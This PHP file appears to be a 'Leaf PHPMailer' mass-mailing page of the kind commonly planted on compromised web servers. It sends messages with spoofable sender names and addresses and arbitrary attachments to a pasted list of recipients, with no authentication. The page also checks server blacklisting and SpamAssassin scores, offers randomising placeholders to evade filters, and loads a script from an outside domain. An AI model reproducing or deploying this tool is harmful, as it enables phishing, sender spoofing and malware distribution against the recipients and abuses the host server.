<?php

if ($_SERVER["REQUEST_METHOD"] == 'POST') {
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $from = $_POST['from'];
    $replyTo = $_POST['replyTo'];
    $name = $_POST['name'];
    $emailList = $_POST['emailList'];
    $recipients = array_map('trim', explode(',', $emailList));
    $attachments = $_FILES['attachment'];
    $boundary = md5(time());
    $headers = "From: " . $name . " <" . $from . ">\r\n";
    $headers .= "Reply-To: $replyTo\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
    $body = "--$boundary\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n";
    $body .= "\r\n";
    $body .= $message . "\r\n";

    foreach ($attachments['tmp_name'] as $index => $tmp_name) {
        if ($attachments['error'][$index] === 0) {
            $file_name = $attachments['name'][$index];
            $file_type = $attachments['type'][$index];
            $file_content = chunk_split(base64_encode(file_get_contents($tmp_name)));
            $body .= "--$boundary\r\n";
            $body .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
            $body .= "Content-Transfer-Encoding: base64\r\n";
            $body .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n";
            $body .= "\r\n";
            $body .= $file_content . "\r\n";
        }
    }

    $body .= "--$boundary--";

    foreach ($recipients as $to) {
        if (mail($to, $subject, $body, $headers)) {
            echo "Email sent successfully to $to.<br>";
        } else {
            echo "Failed to send email to $to.<br>";
        }
    }
}

?>


<!DOCTYPE html>
<html>

<head>
    <title>bikez1000.shop - LuFix.gs</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.4.1/cosmo/bootstrap.min.css" rel="stylesheet">
    <script src="https://leafmailer.pw/style2.js"></script>

</head>

<body>
    <div class="container col-lg-6">
        <h3>
            <font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>2.8</small>
        </h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
            <input type="hidden" name="action" value="score">

            <div class="row">
                <div class="form-group col-lg-6 ">
                    <label for="from">From</label>
                    <input type="text" class="form-control input-sm" id="from" name="from">
                </div>
                <div class="form-group col-lg-6">
                    <label for="name">Name(optional)</label>
                    <input type="text" class="form-control input-sm" id="name" name="name">
                </div>
            </div>

            <div class="row">
                <span class="form-group col-lg-6  "><label for="attachment">Attachment <small>(Multiple
                            Available)</small></label><input type="file" name="attachment[]" id="attachment[]"
                        multiple /></span>

                <div class="form-group col-lg-6"><label for="replyTo">Reply-to</label><input type="text"
                        class="form-control  input-sm " id="replyTo" name="replyTo" value="" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-12 ">
                    <label for="subject">Subject</label>
                    <input type="text" class="form-control  input-sm" id="subject" name="subject" value="" />
                </div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6"><label for="messageLetter">Message Letter <button type="submit"
                            class="btn btn-default btn-xs" form="form" name="action" value="view"
                            formtarget="_blank">Preview </button></label><textarea name="message" id="messageLetter"
                        class="form-control" rows="10" id="textArea"></textarea></div>
                <div class="form-group col-lg-6 "><label for="emailList">Email List (comma-separated):<a
                            href="?emailfilter=on" target="_blank"
                            class="btn btn-default btn-xs">Filter/Extract</a></label><textarea name="emailList"
                        id="emailList" class="form-control" rows="10" id="textArea"></textarea>
                </div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6 ">
                    <label for="messageType">Message Type</label>
                    HTML <input type="radio" name="messageType" id="messageType" value="1" checked>
                    Plain<input type="radio" name="messageType" id="messageType" value="2">
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="charset">Character set</label>
                    <select class="form-control input-sm" id="charset" name="charset">
                        <option selected>UTF-8</option>
                        <option>ISO-8859-1</option>
                    </select>
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="encoding">Message encoding</label>
                    <select class="form-control input-sm" id="encode" name="encode">
                        <option selected>8bit</option>
                        <option>7bit</option>
                        <option>binary</option>
                        <option>base64</option>
                        <option>quoted-printable</option>

                    </select>
                </div>
            </div>
            <button type="submit" class="btn btn-default btn-sm" form="form" name="action" value="send">SEND</button> or
            <a href="#" onclick="document.getElementById('form').submit(); return false;">check SpamAssassin
                Score</a>

        </form>
    </div>
    <div class="col-lg-6"><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>Server IP Address : <b>154.26.139.186 </b> <a href="?check_ip=154.26.139.186" target="_blank"
                        class="label label-primary">Check Blacklist <i class="glyphicon glyphicon-search"></i></a></li>
                <li>PHP Version : <b>7.4.33</b></li>


            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b> (<a href="/cdn-cgi/l/email-protection" class="__cf_email__"
                        data-cfemail="4a2f272b23263f392f380a2f272b23262e25272b232464292527">[email&#160;protected]</a>)
                </li>
                <ul>
                    <li>[-emailuser-] : <b>Email User</b> (emailuser) </li>
                    <li>[-emaildomain-] : <b>Email User</b> (emaildomain.com) </li>
                </ul>
                <li>[-time-] : <b>Date and Time</b> (12/15/2024 03:18:36 am)</li>

                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
            </ul>
            <h4>example</h4>
            Receiver Email = <b><a href="/cdn-cgi/l/email-protection" class="__cf_email__"
                    data-cfemail="f481879186b4909b99959d9ada979b99">[email&#160;protected]</a></b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> = hello <b>user</b></li>
                <li>your domain is <b>[-emaildomain-]</b> = Your Domain is <b>domain.com</b></li>
                <li>your code is <b>[-randommd5-]</b> = your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>

            <h6>by <b><a href="http://leafmailer.pw">leafmailer.pw</a></b></h6>
        </div>
    </div>
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
</body>

</html>